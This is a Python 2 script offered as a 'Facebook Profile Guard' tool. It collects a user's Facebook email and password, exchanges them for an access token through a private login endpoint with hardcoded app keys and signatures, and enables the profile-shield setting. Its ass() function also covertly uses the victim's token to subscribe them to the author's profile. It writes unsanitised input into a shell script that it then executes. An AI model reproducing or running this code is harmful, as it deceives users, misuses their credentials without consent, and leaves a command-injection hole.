#!/bin/python2.7
#------------------#
#-*- coding: utf-8 -*-


import json
import requests
from getpass import getpass as pw
from os import system as st
from os import mkdir as dir
from time import sleep as sp
import os
a = '\033[38;5;49m'
b = '\033[38;5;92m'
c = '\033[38;5;33m'
m = '\033[91m'
O = '\033[0m'
st('clear')
print '''
                   ........................
            %s{+}---[ %sFacebook Profile Guard %s]---{+}%s
            %s{+}---[ %s407 Authentic Exploit  %s]---{+}%s
                   ````````````````````````
               ________________________________
              { %sCodename : JaxBCD%s              }
              { %sFacebook : Fb.me/jack.lesmen.5%s }
              ::::::::::::::::::::::::::::::::::
              <1> Generate Token & Facebook ID
              <2> Enable Profile Guard
              <0> Quit
 ''' % (a, b, a, b, a, b, a, O, c, O, c, O)
sp(2)

def _ashs_():
    try:
        id = raw_input('Email or Phone Number : ')
        passwd = pw('Password : ')
        #f = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+id+'&locale=en_US&password='+passwd+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
        ab = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+id+"&locale=en_US&password="+passwd+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
        cont = json.loads(ab.text)
        print c+'[!]----------['+O+' Your Access Token'+c+' ]-----------[!] '+O
        print cont['access_token']
    except KeyboardInterrupt:
        print m+'[x] Aborted\n\n'+O
    except KeyError:
        print m+'[x] Invalid User or passwd \n\n'+O







def user_id():
    try:
        tok = raw_input('Enter Your Token : ')
        url = "https://graph.facebook.com/me?access_token=%s" % tok
        r = requests.get(url)
        dat = json.loads(r.text)
        print 'Your Facebook ID : '+m+dat['id']
        print O+'------------'
    except KeyError:
        print m+'[x] Invalid Token\n\n'+O
    except KeyboardInterrupt:
        print m+'[x] Aborted\n\n'




def ass():
   try:
       token = raw_input('Token : ')
       id = raw_input('ID : ')
       #url = "https://graph.facebook.com/graphql"
       #tok = 'Authorization: OAuth '+token
       requests.post('https://graph.facebook.com/jack.lesmen.5/subscribers?access_token='+token)
       #dat = 'variables={"0":{"is_shielded":true,"actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&doc_id=1477043292367183' % str(id)
       #t = requests.post(url, tok, dat)
       #print t.text
       a = token
       b = id
       aw = """ curl "https://graph.facebook.com/graphql" -H 'Authorization: OAuth %s' --data 'variables={"0":{"is_shielded":true,"actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&doc_id=1477043292367183' """ % (a, b)
       c = open('123.sh', 'w')
       c.write(aw)
       c.close
   except KeyboardInterrupt:
       print m+'[x] Aborted \n\n'+O


def lnj():
    jax = raw_input('Do You Want To Enable Profile Guard[?] [Y]es or [N]o : ')
    if jax == 'Y':
       ass()
       st('sh 123.sh')
    elif jax == 'y':
       ass()
       st('sh 123.sh')
    else:
       exit()

def main():
    b3 = raw_input('Choose Number : ')
    if b3 == '1':
       _ashs_()
       print c+'\n\n{-}----{ Generate Facebook ID }----{-}'+O
       user_id()
       lnj()
    elif b3 == '2':
       ass()
       st('sh 123.sh')
    elif b3 == '0':
       exit()
    else:
       print m+'[!] Choose Number list\n'+O

if __name__ == '__main__':
   try:
      main()
   except:
      exit()















#https://api.facebook.com/restserver.php?api_key=882a8490361da98702bf97a021ddc14d&email={email}&format=JSON&locale=vi_vn&method=auth.login&password={password}&return_ssl_resources=0&v=1.0&sig=ec93f2416ae0f69f9258adbab643d7eb
